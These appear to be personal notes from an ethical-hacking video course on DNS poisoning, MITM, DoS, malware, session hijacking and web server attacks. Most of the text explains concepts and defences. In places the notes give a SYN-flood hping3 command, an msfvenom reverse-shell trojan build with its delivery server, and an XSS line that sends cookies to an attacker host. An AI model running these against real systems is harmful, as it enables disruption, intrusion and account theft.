+- Store only data relatedl to the requested domain
+- Restrict query responses to only previde information about the requested domain.
+
+HOW DNS POISONING WORKS-
+----------------------------
+- The code for DNS cache poisoning is often found in URLs sent via spam emails. These emails
+attempt to frighten users into clicking on the supplied URL, which in turn infects their
+computer. Banner ads and images -- both in emails and untrustworthy websites -- can also
+direct users to this code. Once poisoned, a user's computer will take them to fake websites
+that are spoofed to look like the real thing, exposing them to risks such as spyware, keyloggers or worms.
+
+RISKS -
+-------------
+-DNS poisoning poses several risks, starting with data theft. Banking websites and popular
+online retailers are easily spoofed, meaning any password, credit card or personal information
+may be compromised. Also, if spoofed sites include Internet security providers, a user's 
+computer may be exposed to additional threats such as viruses or Trojans, because legitimate
+security updates will not be performed. Finally eliminating DNS cache poisoning is difficult,
+since cleaning an infected server does not rid a desktop of the problem, and clean desktops
+connecting to an infected server will be compromised again. If necessary, users can flush their 
+DNS cache to solve the issue.
+- To prvent DNS poisoning, users should never click on a link they don't recognized, and 
+regularly scan their computer for malware. Always do so using a local program rather than a 
+hosted version, since poisoning could spoofWeb-based results.
+
+Video 43:
+==========
+MITM-5
+--------------
+MITM TOOLS- (WIRESHARK)-
+--------------------------
+- Wireshark is a free and open source packet analyzer. It is used for nw trubleshooting.
+analysis, sw and communications protocol developement, and education. Originally named
+Ethereal, the project was renamed Wireshark in May 2006 due to trademark issues.
+
+FEATURES OF WIRESHARK - 
+---------------------------
+- Wireshark has a rich feature set which includes the following.
+- Deep inspection of hundreds of protocols, with more being added all the time
+- Live capture and offline analysis
+- Standard three-pane packet browser
+- Multi-platform: Runs on windows, Linux, OS X, Solaris, FreeBSD, NetBSD, and many others
+- Captured nw data can be browsed via a GUI, or via the TTY-mode Tshark utility
+- The most powerful display filters in the industry
+- Rich VoIP analysis
+- Capture files compressed with gzip can be decompressed on the fly
+- Live data can be read from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, FDDI, and 
+other(depending on your platform)
+- Coloring rules can be applied to the packet list for quick, intuitive analysis
+- Output can be exported to XML, PostScript, CSB, or plain text
+- Decryption support for many protocols, including IPSec, ISAKMP, Kerberos, SNMPv3, SSL/TLS, WEP and WPA/WPA2
+
+WIRESHARK SECURITY- 
+-----------------------
+- Capturing raw nw traffic from an interface requires elevted privileges on some platforms. For
+this reason, older version of Ethereal/Wireshark and tethereal/TShark often ran with superuser
+privileges. Taking into account the huge number of protocol dissectors that are called when traffic is 
+captured, this can pose a serious security risk given the possibility of a bug in a dissector. Due to the 
+rather large number of vulnerabilities in the past(of which many have allowed remote code
+execution) and developers doubts for better future development, OpenBSD removed Ethereal
+from its ports tree prior to OpenBSD
+- Elevaed privileges are not needed for all operations. For example, an alternative is to run tcpdump
+or he dumpcap utility that comes with Wireshark with superuser privileges to capture packets into
+a file, and later analyze the packets by running Wireshark with restricted privileges. To emulate near
+realtime analysis, each captured file may be merged by mergecap into growing file processed by
+Wireshark. On wireless nw, it is possible to use the Aircrack wireless security tools to 
+capture IEEE 802.11 frames and read the resulting dump files with Wireshark.
+-As of Wireshark 0.99.7 Wireshark and TShark run dumpcap to perform traffic capture. Platforms
+that require special privileges to capture traffic need only dumpcap run with those privileges.
+Neither Wireshark nor TShark need to or should be run wiht special privileges.
+
+Video 44:
+============
+MITM Practical 1:
+---------------------
+to get mac address of am IP with in a n/w:
+>arp -a
+>arp -a
+
+Video 45:  --blocking a websit locally
+=================
+MITM Practical 2:
+------------------
+to get Local DNS of the system
+to block any website from your computer
+
+c:\windows\system32\drivers\etc\hosts.txt(open the file with admin rights)
+
+if you want to block any websit
+inside the file give the website address as followes
+---------------------------
+127.0.0.1 www.xyz.com
+127.0.0.1 www.google.com
+----------------------------
+
+Video 46:  --- how to change MAC address using tool TMAC(sw)(scoof-mac address)
+=================
+>ipconfig \all
+
+Video 47: -- sniffing on wireshark for UN and PW entered on Website(http not HTTPS)
+==============
+Wireshark---
+
+inurl:adminlogin
+
+on wireshark
+-- search for http protocol
+-- search for post method
+
+Video 47:
+====================
+DOS(Denial of service attack)-1
+------
+WHAT IS DOS ATTACK-
+------------------------------
+- in computeing, a denial-of-service attack(Dos Attack) is a cyber-attack where the 
+perpetrator seeks to make a machine or n/w resource unavailable to its intended users by
+temporarily or indefinitely disrupting services of a host connected to the Internet. Denial of
+service is typically accomplished by flooding the targeted machine or resource with 
+superfluous requests in an attempt to overload systems and prevent some or all legitimate
+requests from being fulfilled.
+- A DoS attack is analogous to a group of people crowding the entry door or gate to a shop or
+business and not letting legitimate parties enter into the shop or business, disrupting normal
+operations.
+
+TYPES OF ATTACKS.
+- APPLICATION LAYER ATTACKS
+- NETWORK LAYER ATTACKS
+
+APPLICATION LAYER ATTACKS
+----------------------------
+-Application layer attacks (a.k.a layer 7 attacks) can be either DoS or DDoS threats that
+seek to overload a server by sending a large number of requests requiring resource-intensive
+handling and processing. Among other attack vectors, this category includes HTTP floods, slow
+attacks(ex. Slowloris or RUDY) and DNS query flood attacks.
+
+NETWORK LAYER ATTACKS
+--------------------------
+- Network layer attacks(a.k.a layer 3-4 attacks) are almost always DDoS assaults set up to 
+clog the "pipelines" connecting your network. Attack vectors in this category include UDP
+flood, SYN flood, NTP amplification and DNS amplifiction attacks and more.
+-Any of these can be used to prevent access to your servers, while also causing servere
+operational damages, such as account suspension and massive overage charges.
+-DDoS attacks are almost always high-traffic events, commonly measured in gigabits per secon
+(Gbps) or packets per second (PPS). The largest network layer assaults can exceed 200 Gbps;
+however, 20 to 40 Gbps are enough to completely shut down most nw infrastructures
+
+PREPARING FOR DOS ATTACK-
+--------------------------
+- Yoy can't prevent DoS assaults. The fact is that cybercriminals are going to attack. Some are going to
+hit their targets, regardless of the defenses in place.
+- However, there are steps you can take to spot a brewing storm, including:
+- Monitoring your traffic to look for abnormalities, including unexplained traffic spikes and visists from
+suspec IP address and geolocations. All of these could be signs of attackers performing "dry runs"
+to test your defenses before committing to a full-fledged attacks. Recongnizing these for what they
+are can help you prepare for the onslaught to follow.
+- Keep an eye on social media(particularly Twitter) and public wastebins (eg, Pastebin.com) for 
+threats, conversations and boasts that may hint on an incoming attack.
+- Consider using third-party DDoS testing (ie. pen testing) to simulate an attack against your IT
+infrastructure so you can be prepared when the moment of truth arrives. When you undertake this,
+test against a wide variety of attacks, not just those with which you are familiar.
+-Create a respose plan and a rapid response team, whose job is o minimize he impact of an
+assault. when you plan, put in place procedures for your customer support and commnication
+teams,not just for your IT professionals.
+
+Video 49:
+=============
+DoS-2;
+----------
+MITIGATE DOS ATTACK
+---------------------
+"if you spend more on coffee than on IT security, you will be hacked. what's more, you
+deserve to be hacked"
+--Richard Clarke -- National Security Council(NSC)
+
+CHECKLIST FOR DOS ATTACK-
+--------------------------
+- This first step in preparing your organization to deal with a DDoS incident is to assess your
+risk. Important basic questions include:
+- Which infrastructure assets need protection?
+- What are the soft spots, or single points of failure?
+- What is required to take them down?
+- How and when will you know you're targeted? Will it be too late?
+- What are the impacts (financial and otherwise) of an extended outage?
+
+MITIGAING NETWORK LAYER ATTACKS:
+--------------------------------------
+- Dealing with network layer attacks required additional scalability - beyond what your
+own nw can offer.
+- Consequently, in the event of an assault, a BGP announcement is made to ensure that all 
+incoming traffic is routed through a set of scrubbing centers. Each of these has ther capacity to
+process hundreds of Gbps worth of traffic. Powerful servers located in the scrubbing centers
+will then filter out malicious packets, only forwarding the clean traffic to the origin server
+through a GRE tunnel.
+-This method of mitigation provides protection against direct-to-IP attacks and is usually
+compatible with all types of infrasturctures and communication protocols(eg, UDP, SMTP, FTP, VoIP)
+
+MITIGAING APPLICATION LAYER ATTACK-
+--------------------------------------
+- Mitigation of application layer attacks relies on traffic profiling solution that can scale on 
+demand, while also being able to distinguish b/w malicious bots and legitimate website
+visitors.
+- For traffic profiling, best practices call for signature-based and behavior-based heuristics,
+combined with IP reputation scoring and a progressive use of security challenges(eg, JS and cookie challenges)
+- Together, these accurately filter out malicious bot traffic. protecting against application layer
+attacks without any impact to your legitimate visitors.
+
+Video 50: 
+================
+DOS-3:
+--------
+WAYS TO ATTACK DOS-
+--------------------------
+A DoS attack can be done in a sveral ways. The basic types of Dos attack include -
+- Flooding the nw to prevent legitimate nw traffic
+- Disrupting the connections b/w two machines, thus preventing access to a service
+- Preventing a particular individual from accessing a service.
+- Disrupting a service to a specific system or individual
+- Disrupting the state of information, such resetting of TCP sessions
+
+- Another variant of the DoS is the smurf attack. This involves emails with auomatic responses.
+If someone emails hundreds of email messages with a fake return email address to hundreds of 
+people in an orgainzation with am autoresponder on in their email, the initals sent messages can
+become thousands sent to the fake email address. If that fake email address actually belongs to 
+someonem, this can overwhelm that person's account.
+- DoS attacks can cause the following problesm:
+- Ineffective services
+- Inaccessible services
+- Interruption of nw traffic
+- Connection interference
+
+POPULAR FLOOD ATTACKS-
+----------------------------
+- Buffer overflow attacks - the most common DoS attack. The concept is to send more traffic to 
+a nw address than the programmers have built the system to handle. It includes the attacks
+listed below, in addition to others that are designed to exploit bugs specific to certain applications
+or nw
+- ICMP flood - leverages misconfigured nw devices by sending spoofed packets that ping every
+computer on the targeted nw, instead of just one specifc machine. The nw is then
+triggered to amplify the traffic. This attack is also known as the smurf attack or ping of death.
+- SYN flood - sends a request to connect to a server, but never completest the handshake.
+Continues until all open ports are saturated with requests and none are available for legitimate
+users to connect to.
+-Other DoS attacks simply exploit vulnerabilities that cause the target sys or service to crash. In
+these attacks, input is sent that takes advantage of bugs in the target that subsequently crash or
+severely destabilize the sys, so thata it can't be accessed or used.
+
+D-DOS ATTACK -
+--------------------
+- DDoS is short for Distributed Denial of Service. DDoS is a type of DOS attack where multiple
+compromised sys, which are often infected with a Trojan, are used to target a single
+sys causing a Denial of Service (DoS) attack. Victims of a DDoS attack consist of both the
+end targeted system and all sys maliciously used and controlled by the hacker in the 
+distributed attack
+
+HOW DDOS ATTACK WORKS?
+-------------------------
+- In a DDoS attack, the incoming traffic flooding the victime originates from many different
+sources - potentially hundreds of thousands or more. This effectively makes it impossible to 
+stop the attack simply by blocking a single IP address; plus, it is very difficult to distinguish
+legitimate user traffic from attack traffic when spread across so many points of origin.
+
+Video 51:
+==============
+DOS-4
+-------
+DIFFERENCE BETWEEN DOS & DDOS-
+-----------------------------------
+- A Denial of Service (DoS) attack is different from a DDoS attack. The DoS attack typically uses
+one computer and one Internet connection to flood a targeted system or resource. The DDoS
+attack uses multiple computers and internet connection to flood the targeted resource.
+DDoS attacks are often global attacks, distributed via botnets.
+
+TYPES OF DDOS ATTACKS - 
+-------------------------
+- There are many types of DDoS attacks. Common attacks include the following - 
+- Traffic attacks: Traffic flooding attacks send a huge volume of TCP, UPD and ICMP packets to 
+the target. Legitimate request get lost and these attacks may be accompained by malware
+exploitation
+- Bandwidth attacks: This DDos attack overloads the target with massive amounts of junk
+data. This results in a loss of nw bandwidth and equipment resources and can lead to a 
+complete denial of service
+- Application attacks: Application-Layer data messages can deplete resources in the 
+application layer, leaving the target's system services unavailable.
+
+Free DOS ATTACK TOOLS:
+---------------------------
+LOIC(Low Orbit lon Canon)***(tools to attack servers and websits)
+-------------------------------
+- LOIC is one of the most popular DOS attacking tools freely available on the internet. Tis tool
+was used by the popular hacker group Anonymous against many big companies nw last
+year. Anonymous has not only use the tool, but also requested internet users to join their
+DDOS attack via IRC.
+- It can be used simply by a single user to perform a DOS attack on small servers. This tool is 
+really easy to use, even for a beginner. This tool performs a DOS attack by sending UDP, Tcp, or HTTP
+requests to the victim server. You only need to know the URL of IP address of the
+server and the tool will do the rest.
+
+Free DOS ATTACK TOOLS:
+-----------------------
+XOIC(tools to attack servers and websits)
+--------
+XOIC is another nice DOS attacking tool. It performs a DOS attck an any server with an IP
+address, a user-selected port, and a user-selected protocol. Developers of XOIC claim that XOIC
+is more powerful than LOIC in many ways. Lke LOIC, it comes with an easy-to use GUI, so a
+beginner can easly use this tool to perform attacks on other websites or servers.
+
+
+Video 52: DOS Practical
+==============
+tool used -- attack a websit using DOSHTTP tool
+URL used: Websit name or IP addres of nw
+website used: www.xyz.com
+
+Video 53: DOS Practical
+===========================
+-- DOS attack using Kali linux
+Tool used: hping3 -- to flood nw or website
+
+hping3 -S --flood -V www.xyz.com
+hping3 -S --flood -V www.xyz.com
+
+Video 54: Malware 1
+=====================
+- Malware is a malicious sw that damages your computer.
+- Malware can take full control to your computer
+
+-Example of Malware -
+ - Virus
+ - Worm
+ - Bacteria
+ - Trojan Horse
+ - Spyware
+ - Ransomware
+
+PORTS USED BY TROJANS IN SYSTEM-
+
+HOW THEY INFECT YOUR SYSTEM??
+
+TOOLS TO CREATE TROJANS AND TYPES OF TROJANS??
+--------------
+-DARK HORSE TROJAN TOOL
+-CRYPTERS
+
+Types of trojans
+-------------
+-VNC Trojan
+- HTTP/HTTPS Trojan
+- ICMP Trojan
+- Command Shell Trojan
+- Data Hiding Trojan
+- Destructive Trojan
+- Document Trojan
+- GUI Trojan
+- FTP Trojan
+
+WHAT IS VIRUS??
+-----
+- Virus is a self replicating program that it produces its own copy.
+- Virus infects system by different ways
+ - Email attachement
+ - File downloads
+ - Infected disk
+
+CHARATERISTICS OF VIRUS - 
+---------------------------
+- Infects other programs/files.
+- Alters Data
+- Corrupt files and programs
+- Encrypts Itself
+- Self Replication (Creates its own copy)***
+
+Video 55:Malware-2
+==============
+RANSOMWARE - 
+---------------
+- Ransomware is a type of malware which restricts access to computer system's file and folders
+and demands payment from victim to unlock the files
+
+BOOT SECTOR VIRUS - 
+---------------------
+- A boot sector virus is a type of virus that infects the boot sector of floppy disks or the 
+Master Boot Record(MBR) of hard disks(some infect the boot sector of the hard disk
+instead of the MBR)
+1. BIOS
+2. Master Boot Record
+3. Partition Boot Sector
+4. OS
+
+MACRO VIRUSES-
+-----------------
+- A macro virus is a computer virus that "infects" a Microsoft Word or similar application and 
+causes a sequence of actions to be performed automatically when the application is started or
+something els triggers it. Macro viruses tend to be surprising but relatively harmless
+- A macro virus is a computer virus that "infects" a Microsoft word or similar application and 
+causes a sequence of actions to be performed automatically when the application is started or
+something else triggers it. Macro viruses tend to be surprising but relatively harmless. A typical
+effect is the undesired insertion of some comic text at certain points when writing a line. A
+macro virus is often spread as an e-mail virus. A well-known example in March, 1999 was the 
+Melissa virus.
+
+ENCRYPTION VIRUS-
+-----------------
+- If your pictures, videos and documents are encrypted and a "Your personal files are
+encrypted" pop-up is asking for money (Bitcoins BTC) to recover the files, then your
+computer has been infected with the file-encrypting ransomware.
+
+COMPANION VIRUS
+----------------
+- A companion virus creates a companion file for each executable file the virus infects.
+
+VIRUS CREATION SOFTWARES-
+-----------------------------
+-SAMVIRUS GENERATOR
+- JPS VIRUS MAKER
+- DEADLINE VIRUS MAKER
+- SONIC BAT
+- POISON VIRUS MAKER
+
+Video 56- MALWARE-3
+=============
+COMPUTER WORMS
+-------------------
+- computer worms are malicious programs that replicate and execute themselves.
+- Main Feature of worm is they spred in a network automatically. They don't need any carrier.
+
+Interview-
+----
+difference b/w Virus and Worms
+--------------------
+ - Virus and Worms are self replicating program
+ - Main feature of Virus is self replicating
+ - Worms main feature is they spread in a n/w automatically. They don't need any carrier.
+
+Worms Spread Quickly
+---------------------
+Once a worm infects one machine on a n/w
+ - It might as well be on all others with the same security holes
+ - Every machine on the nw need to be cleaned one by one
+ - Any exposed sys could release the worm again and infect all 
+   other systems on the nw
+ - Worms are one of the big reasons that you should always keep
+  you anti-virus and sys up to data
+
+COMPUTER WORM EXAMPLES - 
+---------------------------
+-Ghost Eye Worm
+- Internet Worm Maker Thing
+- Other kinds of computer viruses rely more on curiosity or user naivete to spread. The
+ILOVEYOU, Michelangelo, and MSBlast worms are famous examples. It is best to protect
+against a worm virus by installing antivirus sw right away, rather than waiting to get
+infected before installing an antivirus tool.
+
+MALWARE ANALYSIS
+-------------------
+- Malware analysis is the study or process of determining the functionality, origin and potential
+impact of a given malware sample such as a virus, worm, Trojan horse, rootkit, or backdoor.
+Malware or malicious sw is any computer sw intended to harm the host operating
+system or to steal sensitive data from users, organizations or companies. Malware may include
+sw that gathers user information without permission
+
+MALWARE ANALYSIS-
+----------------
+Malware analysis use cases - 
+--------------------------
+ 1. Computer security incident management: if an organization discovers or suspects that
+    some malware may have gotten into its sys, a response team may wish to perform
+    malware analysis on any potential samples that are discovered during the investigation
+    process todetermine if they are malware and, if so, what impact that malware might have
+    on the sys within the target organizations environment.
+ 2. Malware research: Academic or industry malware researchers may perform malware
+    analysis simply to understand how malware behaves and the latest techniques used in
+    its construction.
+ 3. Indicator of compromise: Extraction: Vendors of sw products and solution may
+    perform bulk malware analysis in order to determine protential new indicators of
+    compromise; this information may then feed the security product or solution to help
+    Organizaions better defend themselves against attack by malware.
+
+MALWARE ANALYSIS TOOLS - 
+------------------------
+- pestudio
+- peid
+- exeinfope
+- PEView
+
+Four stages of malware analysis
+-------------------------------------
+- Examining Malcicious sw involves several stages, however the below stages mentioned can be
+  considered as discrete and sequential steps over-simplifies the steps malware analysis process.
+- Manual code reversing
+- Interactive Behavior Analysis
+- Static Properties Analysis
+- Fully-Automated Analysis
+
+Video 57: Malware 4:
+========================
+HOW TO DETECT MALWARE IN SYSTEM??
+
+There are some methods which you can use to detect malware - 
+- Scan for suspicious ports
+- Scan for suspicious running services
+- Scan for suspicious Files and Folders
+- Scan for suspicious Registry Entries
+- Scan for suspicious Nw Activity
+
+PORT MONITORING TOOLS-
+-------------------------
+TCPVIEW AND CURRPORTS
+
+REGISTRY ENTERY MONITORING TOOL-
+----------------------------------
+- Registry Scanner scans sys registries and scans suspicious programs available in compurteer
+- There are some registry scanning tools available ex - RegScanner
+
+SCAN FOR SUSPICIOUS STARTUP PROGRAMS-
+--------------------------------------
+- Start up programs displays all the programs which loads at the start of sys boot.
+
+FILES AND FOLDER INTEGRITY CHECKER-
+-------------------------------------
+
+DETECT NW ACTIVITIES -
+-----------------------
+- Trojan connects  to hacker and sends user credentials from victim machine that's why network
+analyser tools are handy in these situation.
+-Use tools such as "Capsa" to scan nw
+
+Video 58:Malware-5
+---------------
+COUNTERMEASURES OF MALWARE - 
+--------------------------
+- Avoid opending Email Attachments
+- Block unnecessary port in firewall
+- Monitor the nw traffic
+- Avoid downloading and executing applications
+- Run host based Antivirus
+- Install patches and security updates
+
+ANTI-MALWARE SW
+-------------------
+- Anti Trojan sw
+ - TrojanHunter
+ - Emsisoft Anti-Malware
+ - Anti-Hacker
+ - Trojan- Remover
+ - Zero-Spyware
+ - Super-anti-Syware
+
+MALWARE SUMMARY
+---------------------
+Malware is a malicious sw that damages or disables computer sys and gives
+limited or full control of the sys to the malware creator for the purpose of theft or fraud
+
+Trojan is a progarm in which the malicious or harmful code is contained inside apparently harmle
+programming or data in such a way that it can get control and cause damages, such as running the 
+fil allocaion table on your hard disk
+
+A wrapper binds a Trojan executable with an innocent looking .EXE application such as games or office applications
+
+An exploit kit or crimeware toolkit is a platform to deliver exploits and payload on the target sys
+
+A virus is a self-replicating program that produces its own copy by attahing itself to another
+program, computer boot sector or document
+
+Viruses are categorized according to what do they infect and how do they infect
+
+Awareness and provention measures are the best defences against Trojans and Viruses
+
+Using anti-Trojan and anti-virus tools such as TrojanHunter and Emsisoft Anti-Malware to detect
+and eliminate Trojans and viruses
+
+
+Video 59:
+============
+how to know MALWARE has effected the system
+--we have a tools like 
+ - CumPorts
+ - TCPView
+
+Hacking windows system
+on Kali linux
+--> msfconsole
+
+Video 60:to hack window using Trojan 
+----------------
+Createing - Trojan 
+On Kali Linux:
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=9001 -f exe > /root/Desktop/trojan.exe
+
+creating a server on Kali linux
+> python -m SimpleHTTPServer
+
+on windows access the IP addres of Kail and enter it in browser
+192.168.0.3:8000
+
+Video 61:
+------------------------
+SESSION HIJACKING 1
+- Web applications communicate using HTTP protocol. HTTP is stateless, which means there is
+no support at the protocol level to identify the state of a perticular request. In other words,
+web servers don't have any mechanism to know whether the request is coming from a new
+client from a client which is already communicating with it. So from the server perspective,
+every request it receives is a new request. For instance, let us say a client logged into his
+Facebook account by sending his credentials. Now if he wishes to see his messages, he has to 
+send his credential information again, because the server doesn't normally know that he was
+already authenticated in the previous request. This is something that developers have to do 
+themselves. This is called 'Session Tracking'
+
+HOW CAN SESSION CAN BE TRACED?
+----------------------
+- Sessions are traced by developers primarily through the use of session identifiers (SIDs)
+Once the user is sucessfully authenticated, a session ID is created by the server and 
+maintained by the server. From there on, for every request this value is checked to track the
+user. In other words, session IDs are used as an authentication token so that user does not 
+have to re-enter the credential information with every request.
+
+MECHANISM TO TRACK SESSION - 
+--------------------
+- Based on how the SID this sent and received, there are 3 mechanisms to track sessions.
+
+Cookies:
+- The SID is created and maintained in the server and sent to the user through cookies. A
+cookie is stored in the user's hard disk and goes with each request. The server verifies the 
+same before executing the request. This is the most widely used mechanism and we are going 
+to talk more about this in the below sections
+
+URL Rewriting - 
+- In this the SID value actually goes in the URL of each request. This kind of session tracking is 
+difficult, as we need to keep track of the parameter as a chain link until the conversation completes.
+
+Hidden Fields:
+Hidden fields are elements which are not directly visible to the user. They can ve viewed by
+looking at the page source. Interestingly, they can also be used for session management, as SID
+values can be stored in hidden fields and can be sent to the server with each request. This sort of 
+mechanism is rarely used these days.
+
+
+Video 62:
+----------------------
+SESSION HIJACKING 2
+
+WHAT IS SESSION SIDEJACING
+------------------------------
+- If the application does not use SSL and transports the data in plan text, then anyon within the 
+same n/w can grab the cookie values just by sniffing the traffic using tools such as
+Wireshark. There are a few cases worth mentioning here - 
+
+SSL only for login page:
+- Of course if there is no SSL then the credentials too would be gone(forget about cookies!),
+but there are some developers who use ssl for the login page alone, assumming that the 
+credentials are transported safely. But once the user is authenicated, it is the cookies(that go
+with each request) that identify him. All the requests that are done after logging in contain
+cookies, and if they are not protected with SSL, the session can be easily hijacked. Thus the
+password may not be stolen, but the session can be hijacked.
+
+Single URL is enough to hijack a user:
+- There are several cases where the application uses HTTP to fetch images or JS files that belong
+to some domain. The problem is when you send a request to a domain in which you are
+already signed in, the cookies would automatically go. That is how the cookies work. So in
+simple words, even if there is a single link which goes to the server without HTTPS, the
+cookies would go along with it and can be grabbed by an attacker who is sniffing the nw
+
+WHAT IS SESSION FIXATION-
+--------------------------
+- Session fixation is an attack where the attacker fixes the session in advance and just waits for 
+the user to login in order to hijack it. This is very much applicable to the SIDs in the URL
+scenario. if the application associates a user with an incoming SID without checking if it is
+generated by the server, then this attack is possible.
+
+- An attacker logs into the site www.vulnerablesite.com. The server sets a cookie value and
+returns it to him, say Set-Cookie: SID=abfakjfkdj234 2jdkj
+- The attacker now sends a link to the victim, http://www.vulnerablesite.com/test.php?SID=abfakjfkdj234 2jdkj
+- The victim logs on and the server now assigns the SID value to him. (Why? Due to bad coding, 
+the server does not check if it is generated by itself and tags it with the users)
+-The attacker, who alrady knows the SID value he used, can now just use the same and access
+the victim's account
+
+VIDEO 63:
+--------------------------
+SESSION HIJACKING 3
+------
+METHODS TO HACK SESSION HIJACKING
+---------------------
+Predictable session IDs - 
+- By analyzing the pattern of session IDs, and attacker can predict the session ID of a logged in user
+and thus hijack his account. For ex, consider the below session cookie set by an application.
+- Set-Cookie: sessionid=jdkjdkj4=
+- Although this seems to be random at first look, it is not actually! Base 64 decoding of the above
+value given the below data.
+- Base64 Decode[jdkjdkj4=]=tom:manager
+- Thus an attacker can study this pattern and construct a valid cookie, for instance something like
+Base64 Decode [admin:admin]. Similary, if the session IDs are not random enough, an  attacker can
+try to brute force them to gain access to the application
+
+USING CROSS SITE VULNERABILITY
+------------------------------------
+- This article assumes that the reader is aware of what an XSS attack is about. So we are going
+to take a look at how XSS can be used to stel SID or cookie value. In simple works, XSS
+allows an attacher to execute scripts(Such as JavaScrip) on an end user's browser. Hence an 
+attacker just needs to write a script that can access the cookie value and send it to a server he
+owns. The below script does the same thing. It hits the attacker's site with the cookie value/
+Acccessing the cookie on the client side is possible through use of document.cookie
+
+-http://www.vulnerablesite.com/xssvulnerablepage.jsp?name=<script>document.location=
+"http://www.attackersite.com/cookie_grab.php?c=" + document.cookie</script>
+
+SESSION PUZZLE ATTACHS-
+--------------------------
+- This vulnerablitity occurs when an application uses the same session variable for more than one
+purpose.  Here an attacker tries to access the pages  in a particular order so that the session
+variablel is set in one contex and then used in another. This is best explained in the below Scenario.
+- An attacker visits the applicaition and clicks on the 'Forgot Password' link
+- Now he enters some other user's ID (say admin) and submit
+
+IMPROPER LOGOUT IMPLEMENTATION
+----------------------------------
+- When a user clicks on the logout button, the application is supported to destroy all the session
+variable that are handled on the sever side. But insted, some developers just deleted the
+cookies from the client side using client side code. This seems to work fine when you browse
+normally, because once the cookies are removed from the machine it will redirect to login
+page, but the session on the serve is active indefinitely. This means that an attacher who cna 
+grab this value can still access the application. This senario increses the time period an 
+attacker can launch attacks over valid session
+
+LACK OF SESSION EXPIRATIN MACHANISM
+----------------------------------
+- All applicatins should track idle sessions and automatically redirect the user to a login page
+upon session timeout. Failure to do so would not only increses the time period an attacker can
+lanunc attacks, but also grant access to the application if he has physical acess to that machine.
+Once again, this session expiration must be done at the server level and not jsut at the client 
+level.
+
+Video 64:
+===============
+SESSION HIJACKING-4
+----------------------
+The sequence and ACK number are no longer synchronized b/w client and 
+server, because the server registers having received a new packet that the client never sent.
+Sending more of these packets will create an even greater discrepancy
+b/w sender and receiver
+
+BLIND HIJACKING
+--------------------
+If source routing is disabled, the session hijacker can also employ blind hijacking where he
+injects his malicious data into intercepted communications in the TCp session. It is called
+'blind' because the hijacker can send the data or commands, but cannot see the response. the
+hijacker is basically gussing the responses of the client and server. An example of a malicious
+command a blind hijacker can inject is to set a password that can allow him access from another host.
+
+MAN IN THE MIDDLE: PACKET SNIFFER
+--------------------------------------
+- This technique involves using a packet sniffer that intercepts the communication b/w the 
+client and server. With all the data b/w the hosts flowing through the hijackers sniffer, he
+is free to modify the content of the packets. The trick to this technique is to get the packets to
+be routed through the hijackers host
+
+MAN IN THE MIDDLE: PACKET SNIFFER - 
+-------------------------------------
+- Tools
+1. Hunt and
+2. Juggernaut
+3. TTyWatcher
+4. IPWatcher
+
+SESSION HIJACKING TOOLS 
+-----------------------------
+- ZAP PROXY (BY OWASP)
+--tool to grab the cookies of the website
+
+
+Video 65: -- check vulnarability in the website
+================
+Setting of Zap tool
+ZAP installation(zAttack Proxy)
+
+tool usefullness:
+- To check vulnarability of an website
+- To steal some one's session
+
+Video 66: stell some one's cookies using ZAP tool
+================================
+
+Video 67:
+================
+HACK SERVER-1
+WHAT IS WEB SERVER-
+-------------------------
+- Web server is a program both hw and sw that hosts website; usually target
+s/w vulnerabilities and configuratin erros.
+
+for image see video - 0.32 
+
+IMPACT OF HACKING WEB SERVERS ON ORGANIZATION
+---------------------------------------------
+- Data Tempering and data theft from web servers.
+- Root/admin access to web servers.
+- Secondary attacks on web servers
+- Website crashing/ website defacement
+
+IMPORTANT WEB SERVERS
+----------------------
+- APACHE
+- MICROSOFT IIS
+- NGINX
+
+WEBSERVER ATTACK TYPES - 
+----------------------------
+Injection Attacks-
+----------------
+- Injection Attacks, more specifically SQLI (Structured Query Language Injection) is a techinque
+to modify a DB query string by injecting code into the query. The SQLI exploits a possible
+vulnerability where queries can be executed with unvalidated data. SQLI's are still one of the
+most commonly used websie exploits and can be used to potentially gain access to your
+DB tables including user and PW information. These types of attacks are particularly
+common on enterprise and e-commerce sites where hackers expect large db to be
+present. SQLI attaks are also among the easiest attacks to execute, requiring no moe than a 
+single PC and a small amount of DB knowledge
+
+DDoS -
+-----------
+- Denial of Service(DoS) or Distributed Denial of Service (DDoS) attacks are the most common
+ways to overwhelm a website. These are attempts to flood a site with external requests, making that
+site(and potentially others on the same server) unavailable for users. DOS attacks usually target
+specific ports, IP ranges, or entire nw, but can be targeted to any connected device or service.
+- Denial of service attacks are when one computer with an internet connection attempts to flood a
+server with packets. DDoS on the other hand are when many devices, often widely distributed into
+a botnet attemps to flood the target with hundreds, often thousands of requests
+
+Video 68:
+=============
+HACK SERVERS -2
+-----------
+OTHER ATTACKS ON WEB SERVERS - 
+-------------------------
+Brute Force - 
+--------
+- These are essentially attempts to "crack" every possible combination of username + password
+on a website. Brute Force attacks are looking for weak pw to exploit and grant hackers
+access to your site. Given enough time a brute force attack will ultimately be successful(if no
+other security practices are in effect) so the trick is to make your passwords so secure that it
+would take too long to crack. As computers become more and more powerful the need for 
+stronger passwords becomes increasingly important.
+
+Cross Site Scripting -
+--------------------------
+- Attackers use Cross-site Scripting(XSS) to inject malicious scripts into what would otherwise
+be harmless websites. Because these scripts appear to come from trusted websites, the end-
+users browser often executes the scrip, granting hackers access to information held in 
+cookies or session tokens used with that site. XSS is usually used to gain access of a users
+account.
+
+Best XSS website- *******
+in google type - "xssed"
+click on www.xssed.com
+
+Website Attacks Snapshot - 
+------------------------------
+- While these are the most common types of attacks, they represent less than half of all known
+website exploitation's. The size and volume of attacks have grown steadily and there is a
+constant arms race with server and hosting providers employing ever-evolving nw level
+protection and hackers employing ever stronger attacks.
+
+OTHER ATTACKS ON WEB SERVERS - 
+--------------------------------
+Why Are sites hacked?
+- Hackers are usually attempting to overcome a website's defenses often because of a grudge or
+complaint against that company or site. hackers also work ot bring sites down for commercial or
+political resons (eg. competitors, hacktivists) They can also be criminally minded, and attmpt to 
+extort site owners by obtaining potentially valuable user information or threatening to deface the
+site. Sites hosted on Shared Hosting often have access to large bandwidth, thus making them
+targets to amplify DDoS attacks.
+- The reality is that many types of attacks to websites require hardening of the website code itself. In
+coming posts we'll go into more detail about how you can harden your site defenses over and 
+above what we already provide at a nw level.
+
+Video 69:
+==============
+HACKING SERVERS-3
+-----------
+THE GOAL OF WEBSITE HACKERS-
+---------------------------------
